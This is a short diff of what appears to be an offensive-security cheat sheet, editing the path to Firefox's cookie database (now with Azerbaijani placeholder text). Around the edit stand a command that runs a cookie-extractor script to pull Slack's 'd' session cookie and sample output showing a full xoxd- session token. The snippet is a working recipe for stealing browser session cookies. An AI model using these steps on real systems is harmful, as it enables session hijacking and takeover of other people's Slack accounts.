@@ -7,7 +7,7 @@ $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -
 
 # Firefox Cookie Extraction
 ```powershell
-Firefox: APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite
+Firefox: C:\Users\<Sizin_İstifadəçi_Adınız>\AppData\Roaming\Mozilla\Firefox\Profiles\<təsadüfi_simvollar>.default-release\cookies.sqlite
 python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
 
 Cookie: (201, '', 'd', 'xoxd-CJRafjAvR3UcF%2FXpCDOu6xEUVa3romzdAPiVoaqDHZW5A9oOpiHF0G749yFOSCedRQHi%2FldpLjiPQoz0OXAwS0%2FyqK5S8bw2Hz%2FlW1AbZQ%2Fz1zCBro6JA1sCdyBv7I3GSe1q5lZvDLBuUHb86C%2Bg067lGIW3e1XEm6J5Z23wmRjSmW9VERfce5KyGw%3D%3D', '.slack.com', '/', 1974391707, 1659379143849000, 1658439420528000, 1, 1, 0, 1, 1, 2)
